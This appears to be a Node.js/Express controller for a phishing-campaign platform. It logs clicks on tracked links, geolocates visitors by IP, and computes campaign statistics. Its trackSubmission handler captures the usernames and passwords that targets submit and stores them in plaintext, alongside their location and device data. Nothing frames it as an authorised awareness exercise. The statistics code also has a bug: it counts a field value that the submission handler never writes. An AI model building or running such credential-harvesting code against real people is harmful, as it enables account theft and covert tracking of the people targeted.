const Campaign = require('../models/Campaign');
const ClickLog = require('../models/ClickLog');
const { getLocationFromIP } = require('../services/geoService');

// Track click and log analytics
exports.trackClick = async (req, res) => {
  try {
    const { campaignId, userId } = req.params;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'];

    // Get campaign
    const campaign = await Campaign.findById(campaignId);
    if (!campaign) {
      return res.status(404).json({
        success: false,
        error: 'Campaign not found'
      });
    }

    // Get location from IP
    const location = await getLocationFromIP(ip);

    // Create click log
    const clickLog = new ClickLog({
      campaign: campaignId,
      userId,
      ip,
      userAgent,
      location: {
        country: location.country,
        region: location.region,
        city: location.city,
        coordinates: location.coordinates
      },
      timestamp: Date.now(),
      type: 'click'
    });

    await clickLog.save();

    // Add click log to campaign
    campaign.clickLogs.push(clickLog._id);
    await campaign.save();

    // Redirect to portal
    res.redirect(`/portal/${campaignId}/${userId}`);
  } catch (error) {
    console.error('Error tracking click:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
};

// Track form submission
exports.trackSubmission = async (req, res) => {
  try {
    const { campaignId, userId } = req.params;
    const { username, password } = req.body;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'];

    // Get campaign
    const campaign = await Campaign.findById(campaignId);
    if (!campaign) {
      return res.status(404).json({
        success: false,
        error: 'Campaign not found'
      });
    }

    // Debug: print targets and trackingIds
    console.log('Targets:', campaign.targets.map(t => ({ email: t.email, trackingId: t.trackingId, _id: t._id })));
    console.log('Looking for userId:', userId);

    // Try to find the target by matching trackingId (userId) to a field in targets
    let target = campaign.targets.find(t => t.trackingId === userId);
    if (!target) {
      return res.status(404).json({ success: false, error: 'Target not found for trackingId' });
    }

    // Get location from IP
    const location = await getLocationFromIP(ip);

    // Create submission log
    const submissionLog = new ClickLog({
      campaign: campaignId,
      target: target._id, // Only set if found
      action: 'submit',
      ip,
      userAgent,
      location: {
        country: location.country,
        region: location.region,
        city: location.city,
        coordinates: location.coordinates
      },
      timestamp: Date.now(),
      submittedData: {
        username,
        password
      }
    });

    await submissionLog.save();

    // Add submission log to campaign
    campaign.clickLogs.push(submissionLog._id);
    await campaign.save();

    // Respond with success so frontend can redirect client-side
    res.json({ success: true });
  } catch (error) {
    console.error('Error tracking submission:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
};

// Get campaign statistics
exports.getCampaignStats = async (req, res) => {
  try {
    const { campaignId } = req.params;

    // Get campaign with click logs
    const campaign = await Campaign.findById(campaignId)
      .populate('clickLogs');

    if (!campaign) {
      return res.status(404).json({
        success: false,
        error: 'Campaign not found'
      });
    }

    // Calculate statistics
    const stats = {
      totalTargets: campaign.targets.length,
      totalClicks: campaign.clickLogs.length,
      totalSubmissions: campaign.clickLogs.filter(log => log.type === 'submission').length,
      clickRate: campaign.targets.length > 0 
        ? (campaign.clickLogs.length / campaign.targets.length) * 100 
        : 0,
      submissionRate: campaign.clickLogs.length > 0
        ? (campaign.clickLogs.filter(log => log.type === 'submission').length / campaign.clickLogs.length) * 100
        : 0,
      clicksByCountry: campaign.clickLogs.reduce((acc, log) => {
        const country = log.location.country;
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      clicksByDevice: campaign.clickLogs.reduce((acc, log) => {
        const device = log.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop';
        acc[device] = (acc[device] || 0) + 1;
        return acc;
      }, {}),
      clicksByTime: campaign.clickLogs.reduce((acc, log) => {
        const hour = new Date(log.timestamp).getHours();
        acc[hour] = (acc[hour] || 0) + 1;
        return acc;
      }, {})
    };

    res.status(200).json({
      success: true,
      data: stats
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
};

// Get click analytics for a campaign
exports.getClickAnalytics = async (req, res) => {
  try {
    const { campaignId } = req.params;

    // Get campaign with click logs
    const campaign = await Campaign.findById(campaignId)
      .populate('clickLogs');

    if (!campaign) {
      return res.status(404).json({
        success: false,
        error: 'Campaign not found'
      });
    }

    // Calculate analytics
    const analytics = {
      totalClicks: campaign.clickLogs.length,
      uniqueUsers: new Set(campaign.clickLogs.map(log => log.userId)).size,
      clicksByCountry: campaign.clickLogs.reduce((acc, log) => {
        const country = log.location.country;
        acc[country] = (acc[country] || 0) + 1;
        return acc;
      }, {}),
      clicksByDevice: campaign.clickLogs.reduce((acc, log) => {
        const device = log.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop';
        acc[device] = (acc[device] || 0) + 1;
        return acc;
      }, {}),
      clicksByTime: campaign.clickLogs.reduce((acc, log) => {
        const hour = new Date(log.timestamp).getHours();
        acc[hour] = (acc[hour] || 0) + 1;
        return acc;
      }, {}),
      recentClicks: campaign.clickLogs
        .sort((a, b) => b.timestamp - a.timestamp)
        .slice(0, 10)
        .map(log => ({
          timestamp: log.timestamp,
          location: log.location,
          userAgent: log.userAgent
        }))
    };

    res.status(200).json({
      success: true,
      data: analytics
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
};

// Get real-time click data
exports.getRealtimeClicks = async (req, res) => {
  try {
    const { campaignId } = req.params;
    const lastMinute = Date.now() - 60000; // 1 minute ago

    const recentClicks = await ClickLog.find({
      campaign: campaignId,
      timestamp: { $gte: lastMinute }
    }).sort({ timestamp: -1 });

    res.status(200).json({
      success: true,
      data: recentClicks
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
}; 